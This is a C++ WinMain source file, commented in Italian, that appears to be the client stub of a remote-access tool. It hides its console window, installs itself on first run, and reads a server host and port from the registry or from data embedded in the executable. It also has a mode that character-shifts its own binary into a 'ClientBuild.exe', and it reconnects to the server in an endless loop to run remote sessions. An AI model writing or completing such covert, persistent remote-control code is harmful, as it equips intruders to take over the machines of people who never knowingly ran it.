#include <iostream>
#include <EssNet.h>
#include <Essentials.h>
#include <json.hpp>

using json = nlohmann::json;

string Version = "2.0.0-b.1";
int VersioneCompatibile = 0;

#include "Classi.h"
#include "Funzioni.h"

using namespace std;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    TcpIP Client;
    SystemUtils su;
    DirUtils du;
    Encode en;
    ConsoleUtils cu;
    Settaggi sett;
    EasyMSGB msgb;

    AllocConsole();
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    if (du.CheckFile(du.GetModuleFilePath() + "SetBuild"))
    {
        en.CharShift(69, du.GetFullModuleFilePath(), du.GetModuleFilePath() + "ClientBuild.exe");
        return 0;
    }

    if (!du.CheckFile(du.GetModuleFilePath() + "LocTest"))
    {
        if (!IsInstalled())
        {
            short rtn = InstallClient();
            //msgb.Ok("Codice installazione: " + to_string(rtn));
            return 0;
        }

        sett.GetSettingsFromReg();
    }
    else
    {
        sett.GetSettingsFromExe();
    }

    su.GetCPUload(); // Altrimenti con il GetInfo la prima volta da sempre il 6%

    Client.Host = sett.Host;
    Client.Port = sett.Porta;

    if (Client.StartClient() != 0)
    {
        Client.Stop();
        _getch();
        return 0;
    }

    for (bool i = true; i;)
    {
        while (!Client.Connect()) {}
        
        //msgb.Ok("Connesso!");

        if (COMUNICAZIONI::Inizializzazione(Client.Sock))
        {
            switch (Sessione(Client))
            {
                case 0:
                    closesocket(Client.Sock);
                    break;

                case 1:
                    closesocket(Client.Sock);
                    Client.Stop();
                    return 0;
                    break;
            }
        }
        Client.Stop();
        Client.StartClient();
    }

    system("pause");

    return 0;
}